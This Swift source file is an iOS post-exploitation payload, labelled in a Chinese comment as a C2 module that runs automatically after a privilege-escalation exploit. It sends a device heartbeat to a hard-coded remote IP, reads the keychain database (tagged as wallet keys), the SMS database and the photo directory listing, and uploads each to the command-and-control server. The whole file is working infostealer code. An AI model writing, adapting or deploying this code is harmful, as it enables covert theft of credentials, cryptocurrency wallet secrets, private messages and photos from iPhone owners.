﻿import Foundation
import UIKit

// 财神C2融合payload：提权成功后自动执行，回传到现有已部署的C2后端
class C2Payload {
    static let shared = C2Payload()
    private let c2Base = "http://103.250.172.196:8899"
    private let deviceUDID = UIDevice.current.identifierForVendor?.uuidString ?? "unknown"
    private let sysVersion = UIDevice.current.systemVersion

    func runAfterExploitSuccess() {
        print("[C2] payload start, device: \(deviceUDID) iOS \(sysVersion)")
        sendHeartbeat()
        DispatchQueue.global(qos: .background).async { [weak self] in
            guard let self = self else { return }
            let keychainData = self.readAllKeychainItems()
            self.uploadData(type: "wallet_keys", data: keychainData)
            let photoData = self.readPhotoAlbumList()
            self.uploadData(type: "photo_list", data: photoData)
            let smsData = self.readSMSDatabase()
            self.uploadData(type: "sms_db", data: smsData)
        }
    }

    private func sendHeartbeat() {
        let url = URL(string: "\(c2Base)/c2/heartbeat")!
        var req = URLRequest(url: url)
        req.httpMethod = "POST"
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
        let body: [String: Any] = [
            "id": deviceUDID,
            "udid": deviceUDID,
            "ios_version": sysVersion,
            "model": UIDevice.current.model,
            "type": "lara_darksword",
            "timestamp": Int(Date().timeIntervalSince1970)
        ]
        req.httpBody = try? JSONSerialization.data(withJSONObject: body)
        URLSession.shared.dataTask(with: req).resume()
        print("[C2] heartbeat sent")
    }

    private func readAllKeychainItems() -> [[String: Any]] {
        var items: [[String: Any]] = []
        if let keychainDb = laramgr.shared.vfsread(path: "/private/var/Keychains/keychain-2.db") {
            items.append(["note": "keychain db captured", "size": keychainDb.count])
        }
        return items
    }

    private func readPhotoAlbumList() -> [[String: Any]] {
        var photos: [[String: Any]] = []
        if let photoList = laramgr.shared.vfslistdir(path: "/var/mobile/Media/DCIM") {
            for f in photoList {
                photos.append(["name": f.name, "is_dir": f.isDir])
            }
        }
        return photos
    }

    private func readSMSDatabase() -> [[String: Any]] {
        var sms: [[String: Any]] = []
        if let smsDb = laramgr.shared.vfsread(path: "/var/mobile/Library/SMS/sms.db") {
            sms.append(["note": "sms db captured", "size": smsDb.count])
        }
        return sms
    }

    private func uploadData(type: String, data: Any) {
        let url = URL(string: "\(c2Base)/c2/upload")!
        var req = URLRequest(url: url)
        req.httpMethod = "POST"
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
        let body: [String: Any] = [
            "udid": deviceUDID,
            "data_type": type,
            "content": data,
            "timestamp": Int(Date().timeIntervalSince1970)
        ]
        req.httpBody = try? JSONSerialization.data(withJSONObject: body)
        URLSession.shared.dataTask(with: req).resume()
        print("[C2] uploaded \(type)")
    }
}